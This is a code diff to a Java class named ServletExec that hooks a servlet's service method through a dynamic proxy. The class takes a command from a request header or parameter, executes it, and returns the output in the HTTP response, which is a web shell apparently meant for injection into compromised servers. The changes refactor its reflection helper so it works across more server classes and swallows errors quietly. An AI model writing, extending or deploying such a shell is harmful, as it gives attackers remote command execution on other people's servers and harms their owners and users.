@@ -19,6 +19,9 @@ public class ServletExec implements InvocationHandler {
     private static String HEADER;
     private static String PARAM;
 
+    public ServletExec() {
+    }
+
     public Object invoke(Object proxy, Method method, Object[] args) {
         if (method.getName().equals("service")) {
             run(args[0], args[1]);
@@ -38,8 +41,8 @@ public class ServletExec implements InvocationHandler {
      */
     private void run(Object servletRequest, Object servletResponse) {
         try {
-            Object header = invokeMethod(servletRequest.getClass(), servletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-            Object param = invokeMethod(servletRequest.getClass(), servletRequest, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
+            Object header = invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
+            Object param = invokeMethod(servletRequest, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
             String str = null;
             if (header != null) {
                 str = (String) header;
@@ -47,9 +50,9 @@ public class ServletExec implements InvocationHandler {
                 str = (String) param;
             }
             String result = exec(str);
-            invokeMethod(servletResponse.getClass(), servletResponse, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
-            Object writer = invokeMethod(servletResponse.getClass(), servletResponse, "getWriter", new Class[]{}, new Object[]{});
-            invokeMethod(writer.getClass(), writer, "println", new Class[]{String.class}, new Object[]{result});
+            invokeMethod(servletResponse, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
+            Object writer = invokeMethod(servletResponse, "getWriter", new Class[]{}, new Object[]{});
+            invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
         } catch (Exception e) {
         }
     }
@@ -92,10 +95,14 @@ public class ServletExec implements InvocationHandler {
         return field;
     }
 
-    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
-        Method method = cls.getDeclaredMethod(methodName, argsClass);
+    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        Method method;
+        try {
+            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
+        } catch (NoSuchMethodException e) {
+            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
+        }
         method.setAccessible(true);
-        Object object = method.invoke(obj, args);
-        return object;
+        return method.invoke(obj, args);
     }
 }
